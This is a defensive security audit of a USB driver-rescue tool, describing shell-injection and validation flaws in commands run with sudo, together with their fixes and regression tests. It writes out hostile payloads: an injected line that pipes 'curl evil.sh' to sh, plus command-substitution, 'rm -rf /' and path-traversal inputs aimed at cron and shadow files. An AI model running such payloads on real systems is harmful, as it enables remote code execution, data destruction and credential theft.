# Offensive security audit — August 2026

**Scope:** `dongle-driver-rescue`, S1–S7 invariants from
[ADR 0002](adr/0002-supply-chain-security.md).
**Method:** attack executed against the real code, not a read-through review.
Each payload was built, run, and the result observed.

---

## Summary

| | |
|---|---|
| **Critical** findings | **7** (all fixed) |
| Medium findings | 2 (fixed) |
| Invariants that held | S3 (firmware path), S1 (package command), S2 (allowlist) |
| Regression tests added | 45 |

The central finding was not a weak validator: it was a **correct validator that was never
called**. `require_module_name` existed, covered exactly that case, and the
path that builds commands with `sudo` did not go through it.

---

## CRITICAL-1 — Shell injection in `sudo` command (S1, S6)

`plan_state_b` interpolated the module name directly into shell strings:

```python
f"echo '{vid} {pid}' | sudo tee /sys/bus/usb/drivers/{module}/new_id"
f"printf '...' '{alias.strip()}' | sudo tee -a {conf_path}"
```

The `module` value arrives from **three untrusted sources**:

| Source | Provenance |
|---|---|
| `bound_driver` | read from the host **sysfs** |
| `loaded_module` | read from the host |
| `preferred_module` / `new_id_modules` | knowledge-base JSON |

None was validated. A single quote in the name closes the quoting and appends an
arbitrary command — on a line that **the product itself instructs the user to run with
`sudo`**:

```
echo '148f 7601' | sudo tee /sys/bus/usb/drivers/mt7601u' ; curl evil.sh | sh ; '/new_id
```

Payloads confirmed working before the fix: single quote, `$(id)`,
backtick, path traversal (`../../../../etc/cron.d/evil`), and newline.

This directly contradicts the S1 declared in the ADR: *"no concatenated command or path
without passing through the S2/S3 validation layer"*.

**Fix:** `module = require_module_name(module)` before any
interpolation. 24 regression tests (8 payloads × 3 sources).

---

## MEDIUM-1 — Grammar accepted modules starting with a hyphen (S3)

`[a-z0-9_-]{1,64}` accepted `-rf`, `--force`. Used as a command **argument**,
such a name stops being a name and becomes a flag. No real kernel
module starts with a hyphen.

**Fix:** `[a-z0-9][a-z0-9_-]{0,63}`.

---

## MEDIUM-2 — Rollback validated one path but not the other (S6)

In the same `plan_rollback` function, two standards:

```python
# remove_file — strict
if not (isinstance(path, str) and path.startswith("/")
        and os.path.normpath(path) == path):
    raise ValueError(...)

# remove_new_id — only "is a non-empty string"
if not isinstance(driver, str) or not driver or not isinstance(vid_pid, str):
    raise ValueError(...)
```

`driver="x; id"` passed. The journal lives on disk and can be tampered with: it is
untrusted input like any other.

**Fix:** `require_module_name` on the driver and a hex `vid:pid` regex.

---

## What held

Attacked and **not** broken:

- **Directory traversal in firmware (S3)** — 13 payloads rejected:
  `../../../etc/shadow`, `/etc/passwd`, `..\..\windows`, `a/../../b`,
  `....//....//`, null byte, backslash. Legitimate paths remain accepted.
- **Package install command (S1)** — 9 payloads rejected
  (`; rm -rf /`, `&&`, `-y`, `$(id)`, pipe, newline) and an off-allowlist
  manager refused (S2).
- **Symlink containment** — `os.path.commonpath` prevents escaping the
  firmware root.
- **SPEC §37** — the product still executes no repair.

---

## Method caveat

The audit covered surfaces receiving untrusted input that build
commands or paths. It did **not** cover: testing with a physical USB dongle
plugged in, prolonged parser fuzzing, or analysis of the packaged binary.

The pattern repeating in this repository deserves noting: all 186 tests
passed with the CLI entirely inoperable, and also passed with the shell
injection above. Tests injecting only fake dependencies do not exercise the
path through which the real hostile data enters.
